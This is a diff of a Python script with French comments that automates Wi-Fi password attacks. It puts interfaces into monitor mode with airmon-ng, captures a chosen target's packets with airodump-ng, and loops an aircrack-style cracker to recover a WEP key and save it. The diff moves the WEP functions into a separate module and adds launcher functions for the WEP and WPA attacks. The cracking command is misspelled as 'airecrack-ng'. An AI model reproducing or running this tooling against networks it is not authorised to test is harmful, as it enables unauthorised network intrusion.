@@ -1,15 +1,15 @@
 import subprocess
 import json
-import re
-import pandas as pd
 from Utils.networkscan import *
 from Utils.wpa_attack import *
+from Utils.wep_attack import *
 from Utils.save_to import *
 
 # Ajout Des Success color
-SUCCESS_COLOR = "\033[92m"  # Green
 ERROR_COLOR = "\033[91m"    # Red
+INFO_COLOR = "\033[93m"     # Yellow
 RESET_COLOR = "\033[0m"     # Reset
+SUCCESS_COLOR = "\033[92m"  # Green
 
 # Exécute une commande système et retourne le résultat.
 def execute_command(command):
@@ -25,7 +25,6 @@ def execute_command(command):
     except Exception as e:
         print(f"{ERROR_COLOR}[EXCEPTION]: {e}{RESET_COLOR}")
         return str(e)
-    
 
 # Choix de l'attaque
 def choix_attaque():
@@ -49,10 +48,8 @@ def choix_attaque():
         else:
             print(f"{ERROR_COLOR}[ERROR] : Choix invalide. Veuillez sélectionner 1, 2 ou 3.{RESET_COLOR}\n")
 
-
 # Choix de l'Interface   
 def choix_network_interface():
-
     try:
         # Liste les interfaces réseau
         result = subprocess.run(['ip', 'link', 'show'], stdout=subprocess.PIPE, text=True)
@@ -89,10 +86,8 @@ def choix_network_interface():
     except Exception as e:
         print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
 
-
 # Kill les process en cours
 def kill_process():
-    
     try:
         # Exécution de la commande airmon-ng check kill
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
@@ -100,10 +95,8 @@ def kill_process():
     except subprocess.CalledProcessError as e:
         print(f"{ERROR_COLOR}[ERROR] : Erreur lors de l'exécution de la commande : {e}{RESET_COLOR}")
 
-
 # Lance le mode monitor sur une interface
 def start_mode_monitor(interface):
-    
     try:
         result = subprocess.run(f"sudo airmon-ng start {interface}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         if result.returncode == 0:
@@ -115,7 +108,6 @@ def start_mode_monitor(interface):
     except Exception as e:
         print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
         return None
-    
 
 # Stop le mode monitor sur une interface
 def stop_mode_monitor(interface):
@@ -130,7 +122,6 @@ def stop_mode_monitor(interface):
     except Exception as e:
         print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
         return None
- 
 
 # Liste les Réseaux Disponible avec leur BSSID et leur channel
 def lister_reseaux(interface, fichier_base="Capture/resultats", duree=20, dossier_json="Json"):
@@ -143,47 +134,12 @@ def lister_reseaux(interface, fichier_base="Capture/resultats", duree=20, dossie
         save_to_json(target, dossier_json="Target", filename="target.json")
         clean_capture_directory()
         clean_result_directory()
-        
     except Exception as e:
         print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
-      
-        
-#DANS CETTE DEF, JE VEUX lire le  noombre d'iv récolté
-def get_iv_count(csv_file):
-    """
-    Extrait le nombre d'IV (vecteurs d'initialisation) à partir d'un fichier CSV de capture.
-    
-    :param csv_file: Chemin vers le fichier CSV généré par airodump-ng.
-    :return: Le nombre d'IV sous forme d'entier ou None si les données ne sont pas trouvées.
-    """
-    try:
-        with open(csv_file, "r") as file:
-            lines = file.readlines()
-            data_section = False
-            for line in lines:
-                if data_section:
-                    parts = [p.strip() for p in line.split(",")]
-                    if len(parts) > 10 and parts[10].isdigit():
-                        iv_count = int(parts[10])
-                        print(f"Nombre d'IV : {iv_count}")
-                        return iv_count
-                if line.startswith("BSSID"):
-                    data_section = True
-    except FileNotFoundError:
-        print(f"{ERROR_COLOR}[ERROR] : Le fichier {csv_file} n'existe pas.{RESET_COLOR}")
-    except Exception as e:
-        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")
-    return None
 
 
-# Choix de l'attaque en fonction du fichier Target
+# Choisit le type d'attaque en fonction de la sécurité définie dans target.json.
 def choose_attack_type(target_path="Target/target.json"):
-    """
-    Choisit le type d'attaque en fonction de la sécurité définie dans target.json.
-    
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :return: Une chaîne indiquant le type d'attaque (WPA, WEP, WPS)
-    """
     try:
         with open(target_path, "r") as file:
             target_data = json.load(file)
@@ -219,7 +175,6 @@ def choose_attack_type(target_path="Target/target.json"):
                 print(f"{ERROR_COLOR}[ERROR] : Bug... Contactez KEKE, il y a un souci.{RESET_COLOR}")
             
             return attack_type
-
     except FileNotFoundError:
         print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'existe pas.{RESET_COLOR}")
     except json.JSONDecodeError:
@@ -229,96 +184,15 @@ def choose_attack_type(target_path="Target/target.json"):
     return None
 
 
-# Capture les paquets de la Target WEP
-def capture_from_target_json_wep(interface, target_path="Target/target.json", output_dir="Capture"):
-    """
-    Effectue une capture de paquets à partir des informations du fichier target.json.
-    
-    :param interface: Interface réseau à utiliser pour la capture (par exemple, "wlan0mon").
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :param output_dir: Dossier pour enregistrer les fichiers de capture (par défaut "Capture").
-    """
-    
-    try:
-        # Lecture des données du fichier JSON
-        with open(target_path, "r") as file:
-            target_data = json.load(file)
-            if not target_data:
-                print(f"{ERROR_COLOR}[ERROR] : Le fichier target.json est vide ou mal formaté.{RESET_COLOR}")
-                return
-
-            # Extraction des informations du réseau
-            bssid = target_data["BSSID"]
-            channel = target_data["Channel"]
-
-            # Commande pour airodump-ng
-            capture_file = os.path.join(output_dir, "capture")
-            # command = ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface]
-            
-            # Lancement du processus avec Popen pour permettre l'arrêt
-            process = subprocess.Popen(
-                ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )  
-            
-            time.sleep(5)
-                       
-            # Appel la fonction pour récupérer le nombre d'IV
-            get_iv_count("Capture/capture-01.csv")
-            crack_password_wep(capture_file="capture-01.cap", output_file="password.txt")
-                
-            # Arrêt du processus après la capture
-            process.terminate()
-            print("Processus de capture terminé.")
-
-    except FileNotFoundError:
-        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'existe pas.{RESET_COLOR}")
-    except json.JSONDecodeError:
-        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'est pas un JSON valide.{RESET_COLOR}")
-    except Exception as e:
-        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")
-        
-
-# Crack WEP
-def crack_password_wep(capture_file="Capture/capture-01.cap", output_file="password.txt"):
-    """
-    Automatise le cracking du mot de passe avec airecrack-ng pour le WEP
-    et sauvegarde le mot de passe trouvé dans un fichier.
-    
-    :param capture_file: Le fichier de capture contenant les données pour le crack (par défaut "Capture/capture-01.cap").
-    :param output_file: Le fichier où sauvegarder le mot de passe trouvé.
-    """
-    try:
-        while True:
-            command = f"sudo airecrack-ng {capture_file}"
-            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            if result.returncode == 0:
-                output = result.stdout
-                for line in output.splitlines():
-                    if "KEY FOUND!" in line:
-                        password = line.split()[-1].strip()
-                        with open(output_file, "w") as file:
-                            file.write(f"Mot de passe trouvé : {password}\n")
-                        print(f"{SUCCESS_COLOR}[SUCCESS] : Mot de passe trouvé : {password}{RESET_COLOR}")
-                        print(f"Mot de passe sauvegardé dans : {output_file}")
-                        return
-            
-    except FileNotFoundError:
-        print(f"{ERROR_COLOR}[ERROR] : Le fichier {capture_file} n'existe pas.{RESET_COLOR}")
-    except Exception as e:
-        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")
 
 
+# Lance l'attaque WEP en utilisant les différentes étapes définies.
+def wep_launch_attack(interface, target_path="Target/target.json", output_dir="Capture"):
+    capture_from_target_json_wep(interface, target_path, output_dir)
+    crack_password_wep(capture_file=os.path.join(output_dir, "capture-01.cap"))
+
+# Lance l'attaque WPA en utilisant les différentes étapes définies.
 def wpa_launch_attack(interface, target_path="Target/target.json", output_dir="Capture"):
-    """
-    Lance l'attaque WPA en utilisant les différentes étapes définies.
-    
-    :param interface: Interface réseau à utiliser pour la capture (par exemple, "wlan0mon").
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :param output_dir: Dossier pour enregistrer les fichiers de capture (par défaut "Capture").
-    """
     capture_from_target_json_wpa(interface, target_path, output_dir)
     wordlist_path = list_and_choose_wordlist()
     if wordlist_path:
